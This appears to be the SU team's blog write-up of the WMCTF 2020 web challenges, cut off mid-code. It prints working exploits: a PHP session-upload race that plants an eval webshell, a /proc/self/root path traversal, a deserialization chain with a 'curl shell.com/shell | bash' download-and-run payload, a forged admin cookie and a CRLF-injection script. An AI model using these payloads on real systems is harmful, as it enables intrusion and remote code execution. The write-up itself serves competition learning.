@@ -1,0 +1,946 @@
+<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>WMCTF 2020 SU Write-Up - su-team</title><meta name=description content="感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
+
+以下是我们 SU 本次 WMCTF 2020 的 writeup。"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/wmctf-2020-su-wu\/","name":"Wmctf 2020 su write up"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"WMCTF 2020 SU Write-Up","description":"感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com 以下是我们 SU 本次 WMCTF 2020 的 writeup。\n","inLanguage":"en","wordCount":3086,"datePublished":"2020-08-04T21:35:50\u002b08:00","dateModified":"2020-08-04T21:35:50\u002b08:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["WMCTF"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/wmctf-2020-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="WMCTF 2020 SU Write-Up"><meta property="og:description" content="感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
+
+以下是我们 SU 本次 WMCTF 2020 的 writeup。"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/wmctf-2020-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="WMCTF 2020 SU Write-Up"><meta name=twitter:description content="感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com
+
+以下是我们 SU 本次 WMCTF 2020 的 writeup。"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.157.0"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href="https://su-team.cn/css/codeblock.css?v=20260322-1"><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><script>(function(){var e="dark";try{e=localStorage.getItem("theme")||"dark"}catch{e="dark"}document.documentElement.setAttribute("data-theme",e==="light"?"light":"dark")})()</script><link rel=stylesheet href="/css/team-theme.css?v=20260430-1"></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
+<span class=sr-only>Toggle navigation</span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<a class=navbar-brand href=/><span class=navbar-brand__title>su-team</span>
+</a><button type=button class="theme-toggle mobile-theme-toggle hidden-sm hidden-md hidden-lg" onclick=toggleTheme() aria-label="Toggle theme">
+<svg class="theme-icon-moon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg class="theme-icon-sun" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/page/active-members/>Members</a>
+<a href=/page/pioneers/>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class="nav-theme-toggle hidden-xs"><button type=button class=theme-toggle onclick=toggleTheme() aria-label="Toggle theme">
+<svg class="theme-icon-moon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg class="theme-icon-sun" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></li></ul></div></div></nav><script>function toggleTheme(){var e=document.documentElement,n=e.getAttribute("data-theme")==="light"?"light":"dark",t=n==="dark"?"light":"dark";e.setAttribute("data-theme",t);try{localStorage.setItem("theme",t)}catch{}}</script><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>WMCTF 2020 SU Write-Up</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on August 4, 2020
+&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;15&nbsp;min
+&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;3086&nbsp;words
+&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class="container post-layout" role=main><div class="row flex-row post-layout__row"><div class="col-lg-3 col-md-3 hidden-sm hidden-xs"><aside class=toc-sidebar><h4 class=toc-title>Table of Contents</h4><div class=toc-card><nav id=TableOfContents><ul><li><ul><li><a href=#web>Web</a><ul><li><a href=#web_checkin>web_checkin</a></li><li><a href=#make-php-great-again>Make PHP Great Again</a></li><li><a href=#make-php-great-again-and-again>Make PHP Great Again And Again</a></li><li><a href=#webweb>webweb</a></li><li><a href=#gogogo>gogogo</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#mengyedekending>mengyedekending</a></li><li><a href=#csgo>csgo</a></li><li><a href=#roshambo>roshambo</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#dalabengba>Dalabengba</a></li><li><a href=#xman_happy_birthday>XMAN_Happy_birthday!</a></li><li><a href=#music_game>Music_game</a></li></ul></li><li><a href=#rev>Rev</a><ul><li><a href=#wmware>Wmware</a></li><li><a href=#welcome-to-ctf>Welcome to CTF</a></li><li><a href=#easy_re>easy_re</a></li><li><a href=#meet_in_july>Meet_in_July</a></li><li><a href=#easy_apk>easy_apk</a></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><a href=#babysum>babySum</a></li><li><a href=#piece_of_cake>piece_of_cake</a></li><li><a href=#game>Game</a></li><li><a href=#idiot-box>idiot box</a></li></ul></li></ul></li></ul></nav></div></aside></div><div class="col-lg-9 col-md-9 post-layout__main"><section class=article-shell><article role=main class=blog-post><p>感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 2nd 🥈的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href=mailto:suers_xctf@126.com>suers_xctf@126.com</a></p><p>以下是我们 SU 本次 WMCTF 2020 的 writeup。</p><h2 id=web>Web</h2><h3 id=web_checkin>web_checkin</h3><p><strong>Third Blood</strong></p><p><a href="http://web_checkin.wmctf.wetolink.com/?content=/flag">http://web_checkin.wmctf.wetolink.com/?content=/flag</a></p><h3 id=make-php-great-again>Make PHP Great Again</h3><p>session 包含</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>io</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sessid</span> <span class=o>=</span> <span class=s1>&#39;TGAO&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;cmd&#34;</span><span class=p>:</span><span class=s2>&#34;system(&#39;cat flag.php&#39;);&#34;</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>write</span><span class=p>(</span><span class=n>session</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>f</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>BytesIO</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span> <span class=o>*</span> <span class=mi>1024</span> <span class=o>*</span> <span class=mi>50</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>resp</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span> <span class=s1>&#39;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/index.php&#39;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;</span><span class=p>:</span> <span class=s1>&#39;&lt;?php eval($_POST[&#34;cmd&#34;]);?&gt;&#39;</span><span class=p>},</span> <span class=n>files</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;file&#39;</span><span class=p>:</span> <span class=p>(</span><span class=s1>&#39;tgao.txt&#39;</span><span class=p>,</span><span class=n>f</span><span class=p>)},</span> <span class=n>cookies</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;PHPSESSID&#39;</span><span class=p>:</span> <span class=n>sessid</span><span class=p>}</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>read</span><span class=p>(</span><span class=n>session</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>resp</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=s1>&#39;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/index.php?file=/tmp/sess_&#39;</span><span class=o>+</span><span class=n>sessid</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s1>&#39;tgao.txt&#39;</span> <span class=ow>in</span> <span class=n>resp</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>resp</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>event</span><span class=o>.</span><span class=n>clear</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+++++++++++++]retry&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span><span class=o>==</span><span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl> <span class=n>event</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Event</span><span class=p>()</span>
+</span></span><span class=line><span class=cl> <span class=k>with</span> <span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span> <span class=k>as</span> <span class=n>session</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>   <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>30</span><span class=p>):</span> 
+</span></span><span class=line><span class=cl>       <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>write</span><span class=p>,</span><span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>session</span><span class=p>,))</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>   <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>30</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>       <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>read</span><span class=p>,</span><span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>session</span><span class=p>,))</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl> <span class=n>event</span><span class=o>.</span><span class=n>set</span><span class=p>()</span>
+</span></span></code></pre></div><h3 id=make-php-great-again-and-again>Make PHP Great Again And Again</h3><p><strong>Second Blood</strong></p><p>因为 require_once 读不了 flag.php, 根据上一题 flag 的提示是 php 自己的问题, 找了半天发现<br><a href=https://github.com/php/php-src/blob/master/Zend/zend_virtual_cwd.c>https://github.com/php/php-src/blob/master/Zend/zend_virtual_cwd.c</a></p><p><img class=blog-post__image src=https://hackmd.summershrimp.com/uploads/upload_6c61a5a08c92dbda0b82e77a9ffb0afb.png alt loading=lazy decoding=async></p><p>超过 32 层会停止读符号链接, 所以用 /proc/self/root 套 33 层娃即可</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>v2222</span><span class=o>.</span><span class=n>no_body_knows_php_better_than_me</span><span class=o>.</span><span class=n>glzjin</span><span class=o>.</span><span class=n>wmctf</span><span class=o>.</span><span class=n>wetolink</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=err>?</span><span class=n>file</span><span class=o>=</span><span class=n>php</span><span class=p>:</span><span class=o>//</span><span class=n>filter</span><span class=o>/</span><span class=n>read</span><span class=o>=</span><span class=nb>convert</span><span class=o>.</span><span class=n>base64</span><span class=o>-</span><span class=n>encode</span><span class=o>/</span><span class=n>resource</span><span class=o>=</span><span class=n>compress</span><span class=o>.</span><span class=n>zlib</span><span class=p>:</span><span class=o>//</span><span class=n>file</span><span class=p>:</span><span class=o>///</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>proc</span><span class=o>/</span><span class=bp>self</span><span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>flag</span><span class=o>.</span><span class=n>php</span>
+</span></span></code></pre></div><h3 id=webweb>webweb</h3><p>反序列化 gadgets 挖掘, 没啥好说的, 需要注意下清空一些类的构造函数, 不然东西太多会 413</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>lib/cli/ws.php __destruct 入口, fuction 任意, 参数不可控, 是一个对象
+</span></span><span class=line><span class=cl>lib/db/mongo/mapper.php $this-&gt;collection-&gt;insertone($this-&gt;document); 参数可控
+</span></span><span class=line><span class=cl>lib/db/sql/mapper.php __call 替换 call 的 function, insertone-&gt;任意 function, 到这里可以用任意参数 call 任意单参数函数
+</span></span><span class=line><span class=cl>lib/web.php send 读文件 或者 lib/base.php clear RCE
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>f3</span> <span class=o>=</span> <span class=n>require</span><span class=p>(</span><span class=s1>&#39;lib/base.php&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>ws</span> <span class=o>=</span> <span class=n>new</span> \<span class=n>CLI</span>\<span class=n>WS</span><span class=p>(</span><span class=s2>&#34;0.0.0.0&#34;</span><span class=p>);</span> <span class=o>//</span><span class=err>让</span> <span class=n>base</span> <span class=n>autoload</span> <span class=err>函数加载</span> <span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>ws</span><span class=o>.</span><span class=n>php</span><span class=p>,</span> <span class=err>之后才能用</span> <span class=n>agent</span> <span class=err>类</span><span class=p>,</span> <span class=err>所以要套一层</span> <span class=n>ws</span>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>agent</span> <span class=o>=</span> <span class=n>new</span> \<span class=n>CLI</span>\<span class=n>Agent</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>ws</span><span class=o>-&gt;</span><span class=n>a</span> <span class=o>=</span> <span class=o>$</span><span class=n>agent</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>sqlMapper</span> <span class=o>=</span> <span class=n>new</span> \<span class=n>DB</span>\<span class=n>SQL</span>\<span class=n>Mapper</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>sqlMapper</span><span class=o>-&gt;</span><span class=n>setProps</span><span class=p>(</span><span class=n>array</span><span class=p>(</span><span class=s2>&#34;insertone&#34;</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=n>new</span> <span class=n>Base</span><span class=p>(),</span> <span class=s2>&#34;clear&#34;</span><span class=p>]));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>mongoMapper</span> <span class=o>=</span> <span class=n>new</span> \<span class=n>DB</span>\<span class=n>Mongo</span>\<span class=n>Mapper</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>mongoMapper</span><span class=o>-&gt;</span><span class=n>setDocument</span><span class=p>(</span><span class=s2>&#34;\$</span><span class=se>\n</span><span class=s2>);system(&#39;bash -c </span><span class=se>\&#34;</span><span class=s2>curl shell.com/shell | bash</span><span class=se>\&#34;</span><span class=s2>&#39;);//&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>mongoMapper</span><span class=o>-&gt;</span><span class=n>setCollenciton</span><span class=p>(</span><span class=o>$</span><span class=n>sqlMapper</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>event</span> <span class=o>=</span> <span class=n>array</span><span class=p>(</span><span class=s2>&#34;disconnect&#34;</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=o>$</span><span class=n>mongoMapper</span><span class=p>,</span> <span class=s2>&#34;insert&#34;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>server</span> <span class=o>=</span> <span class=n>new</span> \<span class=n>DB</span>\<span class=n>Mongo</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>server</span><span class=o>-&gt;</span><span class=n>events</span> <span class=o>=</span> <span class=o>$</span><span class=n>event</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>agent</span><span class=o>-&gt;</span><span class=n>setServer</span><span class=p>(</span><span class=o>$</span><span class=n>server</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>$</span><span class=n>dump</span> <span class=o>=</span> <span class=n>serialize</span><span class=p>(</span><span class=o>$</span><span class=n>ws</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>(</span><span class=s1>&#39;curl http://webweb.wmctf.wetolink.com/?a=&#39;</span> <span class=o>.</span> <span class=n>urlencode</span><span class=p>(</span><span class=o>$</span><span class=n>dump</span><span class=p>));</span>
+</span></span></code></pre></div><h3 id=gogogo>gogogo</h3><p><strong>First Blood</strong></p><p>三个点, math/rand 是伪随机, 而且不播种的话结果都是一样的, 本地用同样环境搭一个就可以拿到 admin session</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>MTU5NjM2NzAwNnxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQWNBQlhWdVlXMWxCbk4wY21sdVp3d0hBQVZoWkcxcGJnPT182OYB7Y3m7o504Bjnh5dnTgHrQ8H5hNSyzaYxDB0R0Po=
+</span></span></code></pre></div><p>然后老版本 go 能 crlf, <a href=https://github.com/golang/go/issues/30794>https://github.com/golang/go/issues/30794</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>import requests
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>for i in range(97, 122):
+</span></span><span class=line><span class=cl>    print(chr(i))
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>crlf = open(&#39;/tmp/7&#39;, &#39;rb&#39;).read().decode()
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>data = {
+</span></span><span class=line><span class=cl>    &#39;fn&#39;: &#39;Req&#39;,
+</span></span><span class=line><span class=cl>    &#39;arg&#39;: &#34;http://127.0.0.1/auth/login?a= HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 0\r\n\r\n&#34; + crlf + &#39;\r\n\r\n&#39;
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sess = requests.session()
+</span></span><span class=line><span class=cl>sess.headers[&#39;Cookie&#39;] = &#39;o=MTU5NjM2NzAwNnxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQWNBQlhWdVlXMWxCbk4wY21sdVp3d0hBQVZoWkcxcGJnPT182OYB7Y3m7o504Bjnh5dnTgHrQ8H5hNSyzaYxDB0R0Po=&#39;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>res = sess.post(&#39;http://gogogo.wmctf.wetolink.com/admin/invoke&#39;, data=data)
+</span></span><span class=line><span class=cl>print(res.text)
+</span></span></code></pre></div><p>最后 plugin 必须和编译主程序同一个版本才能被加载, 试了半天发现读 /proc/self/environ 可以读到是 1.9.7
+之后编译一个传上去等应用重启就能 rce 了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nx>main</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=p>(</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=s>&#34;fmt&#34;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=s>&#34;os/exec&#34;</span><span class=w>
